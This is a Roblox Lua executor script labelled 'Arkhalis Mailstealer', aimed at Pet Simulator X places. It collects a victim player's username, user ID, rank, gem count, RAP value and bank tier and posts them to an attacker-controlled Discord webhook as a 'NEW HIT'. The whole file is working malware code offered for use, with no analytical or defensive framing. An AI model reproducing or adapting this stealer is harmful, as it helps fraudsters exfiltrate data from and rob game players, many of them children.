--// Executor detector

local exploit = identifyexecutor()
  
--// Execution Log
if game.PlaceId == 6284583030 then
	_G.GameIn = "Pet Simulator X"
elseif game.PlaceId == 7722306047 then
	_G.GameIn = "PSX Trading Plaza"
elseif game.PlaceId == 10321372166 then
	_G.GameIn = "PSX Hardcore"
elseif game.PlaceId == 12610002282 then
	_G.GameIn = "PSX Pro Trading Plaza"
elseif game.PlaceId == 11725212117 then
	_G.GameIn = "PSX Voice Trading Plaza"
else
	_G.GameIn = "❓ Couldn't find game"
end
local webhookcolor = "13369599"
_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
_G.PlrUserVictim = game.Players.LocalPlayer.Name
_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
_G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
_G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
_G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
local function sendwebhook(msg)
local msg = {
	["content"]= "**🎁NEW HIT WITH ARKHALIS🎁**",
	["embeds"]= {
	  {
		["title"]= "`Arkhalis Mailstealer Results`",
		["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\n💎Gems: **".._G.DisplayDiamond.."**\n⬆️Rap: **".._G.DisplayRap.."**\n📈Bank Tier: **".._G.DisplayBankTier.."**\n☠Executor: **"..exploit.."**",
		["url"]= "https://discord.gg/34fs3FWt",
		["color"]= ""..webhookcolor.."",
  }
  },
	["attachments"] = {}
  }
  local Webhook = _G.Weebhook
  request = http_request or request or HttpPost or syn.request
  request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
  end
  sendwebhook(msg)
